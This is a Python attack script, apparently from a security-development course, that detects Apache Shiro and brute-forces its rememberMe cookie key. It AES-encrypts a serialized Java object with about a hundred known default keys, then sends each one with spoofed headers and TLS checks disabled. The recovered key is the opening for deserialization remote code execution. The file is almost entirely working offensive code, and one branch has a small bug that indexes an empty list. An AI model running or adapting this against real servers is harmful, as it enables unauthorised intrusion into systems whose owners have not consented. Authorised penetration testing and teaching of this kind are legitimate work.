#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time        : 2021/8/3 11:20
# @Author      : Rubicon 
# @File        : Shiro_exploit.py
# @PROJECT_NAME: 安全开发课程
# @Software    : PyCharm


import requests
import random
from Cryptodome.Cipher import AES  # pip install pycryptodomex
import base64
import uuid

import urllib3

urllib3.disable_warnings()


def _http_head():
    USER_AGENTS = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
        "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
        "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
    ]

    ip = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(
        random.randint(1, 254)) + '.' + str(random.randint(1, 254))

    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': ip,
        'Referer': 'http://127.0.0.1',
        'Content-Type': 'application/json',
        "Cookie": "rememberMe=1",
    }
    return headers


keys = [
    'kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'WkhBTkdYSUFPSEVJX0NBVA==', 'RVZBTk5JR0hUTFlfV0FPVQ==',
    'U3ByaW5nQmxhZGUAAAAAAA==',
    'cGljYXMAAAAAAAAAAAAAAA==', 'd2ViUmVtZW1iZXJNZUtleQ==', 'fsHspZw/92PrS3XrPW+vxw==', 'sHdIjUN6tzhl8xZMG3ULCQ==',
    'WuB+y2gcHRnY2Lg9+Aqmqg==',
    'ertVhmFLUs0KTA3Kprsdag==', '2itfW92XazYRi5ltW0M2yA==', '6ZmI6I2j3Y+R1aSn5BOlAA==', 'f/SY5TIve5WWzT4aQlABJA==',
    'Jt3C93kMR9D5e8QzwfsiMw==',
    'aU1pcmFjbGVpTWlyYWNsZQ==', 'XTx6CKLo/SdSgub+OPHSrw==', '8AvVhmFLUs0KTA3Kprsdag==', '66v1O8keKNV3TTcGPK1wzg==',
    'Q01TX0JGTFlLRVlfMjAxOQ==',
    '5AvVhmFLUS0ATA4Kprsdag==', 'ZmFsYWRvLnh5ei5zaGlybw==', '0AvVhmFLUs0KTA3Kprsdag==', 'r0e3c16IdVkouZgk1TKVMg==',
    'Z3VucwAAAAAAAAAAAAAAAA==',
    '5J7bIJIV0LQSN3c9LPitBQ==', 'ZnJlc2h6Y24xMjM0NTY3OA==', 'yeAAo1E8BOeAYfBlm4NG9Q==', 'a3dvbmcAAAAAAAAAAAAAAA==',
    '4BvVhmFLUs0KTA3Kprsdag==',
    's0KTA3mFLUprK4AvVhsdag==', 'yNeUgSzL/CfiWw1GALg6Ag==', 'OY//C4rhfwNxCQAQCrQQ1Q==', 'fCq+/xW488hMTCD+cmJ3aQ==',
    'ZAvph3dsQs0FSL3SDFAdag==',
    'MTIzNDU2NzgxMjM0NTY3OA==', '1AvVhdsgUs0FSA3SDFAdag==', 'Bf7MfkNR0axGGptozrebag==', '1QWLxg+NYmxraMoxAXu/Iw==',
    '6AvVhmFLUs0KTA3Kprsdag==',
    '6NfXkC7YVCV5DASIrEm1Rg==', '2AvVhdsgUs0FSA3SDFAdag==', '9FvVhtFLUs0KnA3Kprsdyg==', 'OUHYQzxQ/W9e/UjiAGu6rg==',
    'ClLk69oNcA3m+s0jIMIkpg==',
    'vXP33AonIp9bFwGl7aT7rA==', 'NGk/3cQ6F5/UNPRh8LpMIg==', 'MPdCMZ9urzEA50JDlDYYDg==', 'c2hpcm9fYmF0aXMzMgAAAA==',
    'XgGkgqGqYrix9lI6vxcrRw==',
    '2A2V+RFLUs+eTA3Kpr+dag==', '5AvVhmFLUs0KTA3Kprsdag==', '3AvVhmFLUs0KTA3Kprsdag==', 'WcfHGU25gNnTxTlmJMeSpw==',
    'bWljcm9zAAAAAAAAAAAAAA==',
    'bWluZS1hc3NldC1rZXk6QQ==', 'bXRvbnMAAAAAAAAAAAAAAA==', '6ZmI6I2j5Y+R5aSn5ZOlAA==', '3JvYhmBLUs0ETA5Kprsdag==',
    'A7UzJgh1+EWj5oBFi+mSgw==',
    'Is9zJ3pzNh2cgTHB4ua3+Q==', '25BsmdYwjnfcWmnhAciDDg==', 'cmVtZW1iZXJNZQAAAAAAAA==', '7AvVhmFLUs0KTA3Kprsdag==',
    '3qDVdLawoIr1xFd6ietnwg==',
    'Y1JxNSPXVwMkyvES/kJGeQ==', 'xVmmoltfpb8tTceuT5R7Bw==', 'O4pdf+7e+mZe8NyxMTPJmQ==', 'SDKOLKn2J1j/2BHjeZwAoQ==',
    'a2VlcE9uR29pbmdBbmRGaQ==',
    'V2hhdCBUaGUgSGVsbAAAAA==', 'GAevYnznvgNCURavBhCr1w==', 'hBlzKg78ajaZuTE0VLzDDg==', '2cVtiE83c4lIrELJwKGJUw==',
    'U3BAbW5nQmxhZGUAAAAAAA==',
    '9AvVhmFLUs0KTA3Kprsdag==', 'SkZpbmFsQmxhZGUAAAAAAA==', 'lT2UvDUmQwewm6mMoiw4Ig==', 'HWrBltGvEZc14h9VpMvZWw==',
    'wGiHplamyXlVB11UXWol8g==',
    '8BvVhmFLUs0KTA3Kprsdag==', 'bya2HkYo57u6fWh5theAWw==', 'IduElDUpDDXE677ZkhhKnQ==', '1tC/xrDYs8ey+sa3emtiYw==',
    'MTIzNDU2Nzg5MGFiY2RlZg==',
    'c+3hFGPjbgzGdrC+MHgoRQ==', 'rPNqM6uKFCyaL10AK51UkQ==', '5aaC5qKm5oqA5pyvAAAAAA==', 'cGhyYWNrY3RmREUhfiMkZA==',
    'MzVeSkYyWTI2OFVLZjRzZg==',
    'YI1+nBV//m7ELrIyDHm6DQ==', 'empodDEyMwAAAAAAAAAAAA==', 'NsZXjXVklWPZwOfkvk6kUA==', 'ZUdsaGJuSmxibVI2ZHc9PQ==',
    'L7RioUULEFhRyxM7a2R/Yg==',
    'i45FVt72K2kLgvFrJtoZRw==', 'zSyK5Kp6PZAAjlT+eeNMlg==', 'kPv59vyqzj00x11LXJZTjJ2UHW48jzHN'
]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 Zxxz/1.0",
    "Connection": "close"}


def aes(payload, key):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(base64.b64decode(payload))
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def aes_v2(payload, key):
    BS = AES.block_size
    mode = AES.MODE_GCM
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = base64.b64decode(payload)
    enc, tag = encryptor.encrypt_and_digest(file_body)
    base64_ciphertext = base64.b64encode(iv + enc + tag)
    return base64_ciphertext


def check_key(url=None, count=0, version=0):
    checker = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
    # checker="rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAhpbmlSZWFsbXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAABdAAFYWRtaW54eAB3AQFxAH4ABXg="
    # checker="rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AC5jb20uamVlY21zLmNvcmUuc2VjdXJpdHkuQ21zQXV0aG9yaXppbmdSZWFsbV8wc3IAF2phdmEudXRpbC5MaW5rZWRIYXNoU2V02GzXWpXdKh4CAAB4cgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAF0AAVhZG1pbnh4AHcBAXEAfgAFeA=="

    try:
        for key in keys:
            if version == 2:
                base64_ciphertext = aes_v2(checker, key)
            elif version == 1:
                base64_ciphertext = aes(checker, key)
            else:
                print("You must Specific Shiro Version to 1 or 2 or left it empty")
            cookie = {"rememberMe": base64_ciphertext.decode()}
            print("Checking :{0}".format(key), end='\r')
            rsp = requests.get(url, cookies=cookie, headers=headers, allow_redirects=False, verify=False)
            if 'Set-Cookie' not in rsp.headers.keys() or rsp.headers['Set-Cookie'].count(
                    "rememberMe=deleteMe") == count - 1:
                print("Version " + str(version) + " Key Found: {}".format(key))
                msg = "Version " + str(version) + " Key Found: {}".format(key)
                return msg
            else:
                pass
    except Exception as e:
        pass


def get_vul_info():
    vul_info = {
        "type": "web",
        "author": "PgHook",
    }
    return vul_info


def bug_check(date):
    u_address=[]
    if 'http' in date:
        u_address[0] = date
    else:
        u_address = ['http://' + date, 'https://'+date]  #判断目标ip 80和443端口是否开发
        for u in u_address:
            try:
                requests.get(u, timeout=1, verify=False)
            except:
                u_address.remove(u)

    for url in u_address:   # 对开发端口的目标进行，漏洞检测
        try:
            print('shiro vule check:', url)
            res = requests.get(url, allow_redirects=False, headers=_http_head(), timeout=5, verify=False)
            if "deleteMe" in str(res.headers):
                count = res.headers['Set-Cookie'].count("rememberMe=deleteMe")

                res = check_key(url, count, version=2)
                if res:
                    vule_date = {'vule_name': 'Shiro exploit', 'severity': 'high', 'vule_url': url + '   ' + res,
                                 'url': url,
                                 'msg': res}
                    return vule_date
                else:

                    res1 = check_key(url, count, version=1)
                    if res1:
                        vule_date = {'vule_name': 'Shiro exploit', 'severity': 'high', 'vule_url': url + '   ' + res1,
                                     'url': url, 'msg': res1}
                        return vule_date

                vule_date = {'vule_name': 'Shiro detection', 'severity': 'info', 'vule_url': url, 'url': url}
                return vule_date
        except:
            pass
